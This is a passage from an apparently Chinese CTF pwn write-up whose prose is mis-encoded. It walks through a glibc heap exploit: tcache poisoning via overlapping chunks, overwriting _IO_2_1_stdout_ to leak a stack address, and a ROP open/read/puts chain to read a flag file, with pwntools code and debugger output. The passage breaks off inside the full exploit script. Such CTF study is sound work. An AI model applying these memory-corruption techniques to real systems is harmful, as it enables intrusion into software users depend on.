å·²ç»å†™çš„å¾ˆè¯¦ç»†äº†ã€‚</p>\n<p>ä»æ­¤æ–‡ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å°† fake ä¸€ä¸ªå †å—åˆ°_IO_2_1_stdoutï¼Œç„¶åå°†å…¶ Flags æ”¹æˆ <code>0xfdab1800</code> ï¼Œå†å°† _IO_write_base æ”¹æˆæˆ‘ä»¬æƒ³æ³„éœ²çš„åœ°å€çš„ <code>èµ·å§‹åœ°å€</code> ï¼Œæœ€åæŠŠ _IO_write_ptr å’Œ _IO_write_end æ”¹æˆæ³„éœ²åœ°å€çš„ <code>ç»ˆç‚¹åœ°å€</code> å³å¯ã€‚</p>\n<p>ä½†æ˜¯ç¨‹åºå½“ä¸­å·²ç»æ²¡æœ‰ uafï¼Œé‚£å¦‚ä½•åœ¨å»æ§åˆ¶ fd å»åšæˆ‘ä»¬çš„ fake_chunk å‘¢ï¼Ÿ</p>\n<p>åˆ©ç”¨ tcache å»åšæ˜¯æ¯”è¾ƒç®€å•çš„ã€‚é‚£å¦‚ä½•å»åˆ©ç”¨å‘¢ï¼Ÿ</p>\n<p>å¯¹ï¼Œä½¿ç”¨å †æ‹“å±•æ”»å‡»å³å¯ã€‚</p>\n<p><img data-src=\"D:/%E7%AC%94%E8%AE%B0/picture/Untitled/image-20240621145849635.png\" alt=\"image-20240621145849635\"></p>\n<p>è¿™æ˜¯æ­¤æ—¶ bins é“¾è¡¨ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿®æ”¹ä¸€ä¸‹æ³„éœ² libc çš„ä»£ç ï¼Œè¦ä¸ç„¶æ— æ³•è¿›è¡Œå †æ‹“å±•æ”»å‡»</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'Leaklibc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'gep'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>uaf<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>__malloc_hook <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>libcbase <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>env <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'environ'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libcbase<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿›è¡Œå †æ‹“å±•æ”»å‡»</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#ç½®å…¥ unsortedbin å†…</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'tcache'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#æ­¤æ—¶ unsortedbin å†…åŒ…å«è¿™ tcache</span></pre></td></tr></table></figure><p><img data-src=\"D:/%E7%AC%94%E8%AE%B0/picture/Untitled/image-20240621151328883.png\" alt=\"image-20240621151328883\"></p>\n<p>æ­¤æ—¶æˆ‘ä»¬å»ç”³è¯·ä¸€ä¸ª chunk ä½¿å…¶ä» unsortedbin æ‹¿å–ã€‚æ‰€ä»¥ç”³è¯·ä¸ª 0x70ï¼ˆsize&lt;0x110 ä¸”ä¸èƒ½ç­‰äº 0x80</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'tcache'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#æ­¤æ—¶å°±ä¼šä¿®æ”¹ tcache çš„ fd æŒ‡é’ˆ   #2</span></pre></td></tr></table></figure><p>ç„¶åæ­¤æ—¶å†å»ç”³è¯· 0x80 çš„ chunk å°±å¯ä»¥å¾—åˆ° _IO_2_1_stdout çš„ chunk</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'nextptr'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfdab1800</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>env<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>env<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#4</span></pre></td></tr></table></figure><blockquote>\n<p>pwndbg&gt; dps 0x7ffff7fc26a0<br>\n00:0000â”‚ rsi 0x7ffff7fc26a0 (<em>IO_2_1_stdout</em>) â—‚â€” 0xfdab1800<br>\n01:0008â”‚     0x7ffff7fc26a8 (<em>IO_2_1_stdout</em>+8) â—‚â€” 0x0<br>\nâ€¦ â†“        2 skipped<br>\n04:0020â”‚     0x7ffff7fc26c0 (<em>IO_2_1_stdout</em>+32) â€”â–¸ 0x7ffff7fc4600 (environ) â€”â–¸ 0x7fffffffdef8 â€”â–¸ 0x7fffffffe25e â—‚â€” â€˜SHELL=/bin/bashâ€™<br>\n05:0028â”‚     0x7ffff7fc26c8 (<em>IO_2_1_stdout</em>+40) â€”â–¸ 0x7ffff7fc4608 â—‚â€” 0x0<br>\n06:0030â”‚     0x7ffff7fc26d0 (<em>IO_2_1_stdout</em>+48) â€”â–¸ 0x7ffff7fc4608 â—‚â€” 0x0<br>\n07:0038â”‚     0x7ffff7fc26d8 (<em>IO_2_1_stdout</em>+56) â€”â–¸ 0x7ffff7fc2723 (<em>IO_2_1_stdout</em>+131) â—‚â€” 0xfc37e0000000000a /* â€˜\\nâ€™ */</p>\n</blockquote>\n<p>æ­¤æ—¶åªè¦å»æ‰§è¡Œä¸€æ¬¡ puts æˆ–è€… prinf å°±å¯ä»¥æ³„éœ²æ ˆåœ°å€</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele_<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>dele_<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'nextptr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>pop_rdi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000023b6a</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>pop_rsi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000002601f</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>pop_rdx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000142c92</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>open_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>read_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>write_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sendfile_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'sendfile'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>puts <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>flag_addr <span class=\"token operator\">=</span> stack_addr</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'./flag\\x00\\x00'</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># open('./flag', 0)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>open_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># read(3, stack_addr - 0x200, 0x50)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdx_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># write(1, stack_addr - 0x200, 0x50)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(stack_addr - 0x200) + p64(pop_rdx_ret) + p64(0x50) + p64(write_addr)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(3) + p64(pop_rdx_ret) + p64(0) + p64(sendfile_addr)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>å†æ¬¡åˆ©ç”¨å †æ‹“å±•æ”»å‡»ï¼Œç”³è¯·åˆ°æ ˆä¸Šï¼ŒåŠ«æŒè¿”å›åœ°å€è¿›è¡Œ orw å³å¯</p>\n<h2 id=\"å®Œæ•´exp\"><a class=\"markdownIt-Anchor\" href=\"#å®Œæ•´exp\">#</a> å®Œæ•´ exp</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># host, port = \"47.103.122.127:30175\".split(\":\")</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r = remote(host, int(port))</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./pwn')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #è®¾ç½®ç§å­</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length             <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">meau</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Choice: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input size: \\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input content: \\n\"</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input idx: \\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\"># only one</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input idx: \\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">uaf</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\"># only one</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">666</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input idx: \\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token 